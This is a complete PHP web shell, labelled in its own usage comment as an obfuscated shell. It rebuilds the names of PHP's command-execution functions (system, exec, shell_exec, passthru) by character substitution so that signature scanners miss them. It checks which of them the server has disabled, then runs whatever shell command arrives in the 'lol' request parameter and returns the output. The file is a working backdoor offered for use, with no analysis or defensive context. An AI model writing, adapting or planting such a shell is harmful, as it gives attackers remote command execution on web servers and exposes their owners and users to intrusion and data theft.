<?php // Usage example: GET /another_obfuscated_phpshell.php?lol=ls%20-al
$S=array(m("ncoai","msyte", "cocain"),m("sir","cex","iris"),m("otab","lshe","taboo")."_".m("sir","cex","iris"),m("gbledin","upasthr","bleeding"));
$TR=m("etroubl","edisabl","trouble");$MK=m("dpreambl","sfunctio","preambled");$D=explode(",",ini_get($TR.'_'.$MK));$P=$_REQUEST;
function m($a,$b,$c) {return str_replace(str_split($a), str_split($b), $c);}
foreach($S as $A) {
    if(!in_array($A, $D)) {
        if($A == m("ncoai","msyte","cocain")) $A($P['lol']);
        elseif($A == m("sir","cex","iris")) {
            exec("$P 2>&1", $arr);
            echo join("\n",$arr)."\n";
        } else echo $A($P['lol']);
        exit;
    }
}